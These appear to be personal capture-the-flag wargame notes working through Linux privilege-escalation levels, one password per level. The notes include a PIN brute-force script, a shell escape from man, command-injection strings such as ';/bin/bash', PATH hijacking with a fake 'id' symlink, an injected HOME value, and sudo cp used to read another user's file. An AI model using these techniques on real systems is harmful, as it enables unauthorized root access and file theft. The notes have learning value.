-lvl hacker
pass: begood!
chall type: SUID binary misuse
NOTES
> An suid binary is a program that runs with the owner's permissions' instead of the one executing it eg; sudo
> ls -l will show u perms, an s represents an suid binary, perm 4000 = SUID
> acatha left us a gift to attain her powers

sol;
    ls / , pazz contains the pass bt we cant run it, we need an suid binary designed to the file as the owner(acantha)
    find / -perm -4000 -type f 2>/dev/null or find / -type f -perm -u=s 2>/dev/null
    ls -l  the file and run the binary
    

-lvl acantha
pass: mYYLhLBSkrzZqFydxGkn
chall typ: pin breute forcing
sol;
    #!/usr/bin/env python3
import subprocess, random, sys, os

COMMON = ["123456","000000","111111","123123","654321","112233","121212","999999"]
binary = sys.argv[1] 

if not os.access(binary, os.X_OK):
    sys.exit(f"[!] not executable: {binary}")

seen = set(COMMON)
pins = COMMON + random.sample([f"{i:06d}" for i in range(1_000_000) if f"{i:06d}" not in seen], 1_000_000 - len(seen))

for pin in pins:
    try:
        r = subprocess.run([binary], input=pin+"\n", capture_output=True, text=True, timeout=1)
        out = r.stdout + r.stderr
        if r.returncode == 0 and "NO" not in out and out.strip():
            print(f"FOUND: {pin}\n{out}")
            break
    except subprocess.TimeoutExpired:
        continue
    except KeyboardInterrupt:
        sys.exit("\n[!] stopped")

  run it with the bin as an arg

-lvl alala
pass: DsYzpJQrCEndEWIMxWxu
chall type: SUID BINARY ABUSE
chall break down:
    1. binary perms -rwS--s--- 1 root alala 
    2. file perms-  -r--r--- 1 althea althea
goal:
    cat the file, through the binary
sol; 1. ./read, run the file
     > launches the man page, this binary is likely a SUID wrapper around the man command
     > The man command allows shell escapes via !command. For example, typing !sh while viewing a man page usually spawns a shell.
     > Since read runs as root due to the SUID bit, any shell spawned through man will also run as root
   
     2. !sh
     3. cat the pass
     4. ssh althea@localhost
      > su failed because the binary is blocked for your user. Usually one of these:
         + no execute permission on /usr/bin/su
         +restricted shell
         +AppArmor/SELinux
         +containerized lab intentionally blocking privilege switching
      > ssh alala@localhost works because localhost is a valid SSH target on your own machine(alala). both usersw run on the same system

-lvl althea
pass: ObxEmwisYjERrDfvSbdA
chall type: SUID binary abuse for cmd injection
chall break down:
    1. same binary perms as above 
    2. same but different user
goal: cat the pass 
sol; 1. ./lsme
    >it does something like this--> system("ls " + input);, assuming
    >you enter the file path
    >owner of the bin is root of group althea

     2. ;whoami
    >tried injecting and chaining the command with system();
    > system("ls " + user_input); this allows us to chain commands because system tells the OS to open a shell and run this string as a command
     3.;/bin/bash
    > seems like the binary sets uid to andromeda to exec ls so spawning the shell by default if for the andromeda user

-lvl andromeda
pass: OTWGTbHzrxhYFSTlKcOt
chall type: SUID binary abuse for path injection
chall breakdown; 
        SAME
        > Path hijacking happens when a program calls a command without an absolute path
sol; 
     1. uid runs the id cmd, i assumed it ran through a relative path becuse each user has their own programs and executables
     
     2. ln -s /bin/bash /tmp/id
       >creates a symlink thats points to the shell
       > uid binary looks for id, relatively, echo $PATH should show the path it takes to look for it, our goal is to spawm an elevated shell throuh the binary
     3. PATH=/tmp:$PATH
       > set the path to begin with tmp where we created our fake id(symlink) that spawns a shell
       > the ln -s /bin/sh /tmp/id makes /tmp/id -> /bin/bash

-lvl anthea
pass: yWFLtSNQArEBTHtWgkKd
chall type: SUID abuse for env var abuse
sol; 
    1. ./obsessed
   > the binary inherits ENV varible to run 
    2. export MYID=94
   > WRONG ENV
    3. for id in {1..100}; do env -i MYID=$id ./obsessed; done
   > tried bruteforcing 
    4. env -i MYID=^ ./obsessed 
   > last hope, i tried the ascii 94 which is the caret (^) symbol

-lvl aphrodite
pass: HPJVaqRzieKQeyyATsFv
chall type: SUID binary abuse for env+cmd injection 
assumption: binary does -> ls $HOME
sol; 
    1. env -i HOME=";cat /pwned/aphrodite;cat ariadne_pass.txt: ./homecontent

-lvl ariadne
pass: iNgNazuJrmhJKWixktzk
chall type: sudo privilege abuse
sol;
    1.  find / -name "arete_pass.txt" 2>/dev/null
    2.  sudo -u arete /bin/cp /run/lock/arete_pass.txt /dev/stdout
   > /dev/stdout, is the output so the file is automatically read

-lvl arete
pass: QjrIovHacmGWxVjXRLmA
chall typesta




